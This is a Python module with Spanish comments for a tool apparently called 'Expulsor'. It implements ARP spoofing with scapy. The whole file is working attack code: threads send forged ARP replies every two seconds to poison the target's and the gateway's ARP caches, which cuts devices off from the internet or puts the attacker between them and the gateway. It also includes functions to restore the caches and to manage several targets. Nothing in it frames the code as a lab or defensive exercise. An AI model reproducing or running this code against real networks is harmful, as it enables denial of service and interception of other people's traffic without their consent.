"""
Módulo de ARP Spoofing para Expulsor
"""

import threading
import time
from typing import Callable, Optional

from scapy.all import ARP, Ether, send, srp


class ARPSpoofer:
    """Implementa funcionalidad de ARP Spoofing para restringir el acceso a internet de dispositivos"""
    
    def __init__(self, gateway_ip: str, gateway_mac: str, local_mac: str):
        """
        Inicializa el ARP Spoofer
        
        Args:
            gateway_ip: IP de la puerta de enlace
            gateway_mac: MAC de la puerta de enlace
            local_mac: MAC de este dispositivo
        """
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.local_mac = local_mac
        self.targets = {}  # {ip: {'mac': mac, 'thread': thread, 'running': bool}}
        self.status_callback = None
    
    def set_status_callback(self, callback: Callable[[str, str, bool], None]):
        """
        Establece un callback para informar sobre cambios de estado
        
        Args:
            callback: Función que se llamará con (ip, mensaje, éxito)
        """
        self.status_callback = callback
    
    def _get_mac(self, ip: str) -> Optional[str]:
        """Obtiene la dirección MAC de un dispositivo dada su IP"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request
            answered, _ = srp(packet, timeout=2, verbose=0)
            
            if answered:
                return answered[0][1].hwsrc
        except Exception as e:
            self._report_status(ip, f"Error al obtener MAC: {e}", False)
        return None
    
    def _report_status(self, ip: str, message: str, success: bool = True):
        """Informa sobre el estado mediante el callback si está configurado"""
        if self.status_callback:
            self.status_callback(ip, message, success)
        else:
            print(f"[{'✓' if success else '✗'}] {ip}: {message}")
    
    def _spoof_target(self, target_ip: str, target_mac: str):
        """Método interno que se ejecuta en un hilo para el spoofing de un objetivo"""
        target_info = self.targets.get(target_ip)
        if not target_info:
            return
        
        try:
            self._report_status(target_ip, "Iniciando restricción de acceso")
            
            # Crear paquetes ARP para el spoofing
            # 1. Decirle al objetivo que somos la puerta de enlace
            target_packet = ARP(
                op=2,  # ARP Reply
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.local_mac
            )
            
            # 2. Decirle a la puerta de enlace que somos el objetivo
            gateway_packet = ARP(
                op=2,  # ARP Reply
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=target_ip,
                hwsrc=self.local_mac
            )
            
            # Enviar paquetes mientras el spoofing esté activo
            while self.targets.get(target_ip, {}).get('running', False):
                try:
                    # Enviar paquetes
                    send(target_packet, verbose=0)
                    send(gateway_packet, verbose=0)
                    time.sleep(2)  # Enviar cada 2 segundos
                except Exception as e:
                    self._report_status(target_ip, f"Error durante el spoofing: {e}", False)
                    # Continuar a pesar del error, podría ser temporal
            
            # Restaurar la conexión si se detuvo el spoofing
            self._restore_connection(target_ip, target_mac)
            
        except Exception as e:
            self._report_status(target_ip, f"Error fatal en el spoofing: {e}", False)
            self._restore_connection(target_ip, target_mac)
    
    def _restore_connection(self, target_ip: str, target_mac: str):
        """Restaura la conexión normal enviando paquetes ARP correctos"""
        try:
            # Corregir la tabla ARP del objetivo
            target_restore = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # Corregir la tabla ARP de la puerta de enlace
            gateway_restore = ARP(
                op=2,
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            
            # Enviar varias veces para asegurar que se restaure la conexión
            for _ in range(5):
                send(target_restore, verbose=0)
                send(gateway_restore, verbose=0)
                time.sleep(0.2)
            
            self._report_status(target_ip, "Conexión restaurada correctamente")
            
        except Exception as e:
            self._report_status(target_ip, f"Error al restaurar la conexión: {e}", False)
    
    def start_spoofing(self, target_ip: str) -> bool:
        """
        Inicia el ARP Spoofing para un objetivo
        
        Args:
            target_ip: IP del dispositivo objetivo
        
        Returns:
            bool: True si se inició correctamente, False en caso contrario
        """
        # Verificar si ya está activo
        if target_ip in self.targets and self.targets[target_ip].get('running', False):
            self._report_status(target_ip, "La restricción ya está activa", True)
            return True
        
        # Obtener MAC del objetivo
        target_mac = self._get_mac(target_ip)
        if not target_mac:
            self._report_status(target_ip, "No se pudo obtener la MAC del objetivo", False)
            return False
        
        # Iniciar el hilo de spoofing
        spoof_thread = threading.Thread(
            target=self._spoof_target,
            args=(target_ip, target_mac),
            daemon=True
        )
        
        # Registrar el objetivo
        self.targets[target_ip] = {
            'mac': target_mac,
            'thread': spoof_thread,
            'running': True
        }
        
        # Iniciar el hilo
        spoof_thread.start()
        self._report_status(target_ip, "Restricción de acceso iniciada correctamente")
        return True
    
    def stop_spoofing(self, target_ip: str) -> bool:
        """
        Detiene el ARP Spoofing para un objetivo
        
        Args:
            target_ip: IP del dispositivo objetivo
        
        Returns:
            bool: True si se detuvo correctamente, False en caso contrario
        """
        if target_ip not in self.targets:
            self._report_status(target_ip, "El objetivo no está siendo restringido", False)
            return False
        
        # Marcar para detener
        self.targets[target_ip]['running'] = False
        
        # Esperar a que termine (con timeout)
        if self.targets[target_ip]['thread'].is_alive():
            self.targets[target_ip]['thread'].join(timeout=5)
        
        # Eliminar de la lista
        target_info = self.targets.pop(target_ip, None)
        
        # Si no se restauró por alguna razón, intentar restaurar manualmente
        if target_info and 'mac' in target_info:
            self._restore_connection(target_ip, target_info['mac'])
        
        self._report_status(target_ip, "Restricción de acceso detenida correctamente")
        return True
    
    def is_spoofing(self, target_ip: str) -> bool:
        """
        Verifica si un objetivo está siendo spoofed
        
        Args:
            target_ip: IP del dispositivo objetivo
        
        Returns:
            bool: True si está activo, False en caso contrario
        """
        return target_ip in self.targets and self.targets[target_ip].get('running', False)
    
    def get_all_targets(self):
        """
        Obtiene todos los objetivos que están siendo spoofed
        
        Returns:
            dict: {ip: mac} de todos los objetivos activos
        """
        return {ip: info['mac'] for ip, info in self.targets.items() if info.get('running', False)}
    
    def stop_all(self):
        """Detiene todos los ataques ARP Spoofing activos"""
        for ip in list(self.targets.keys()):
            self.stop_spoofing(ip)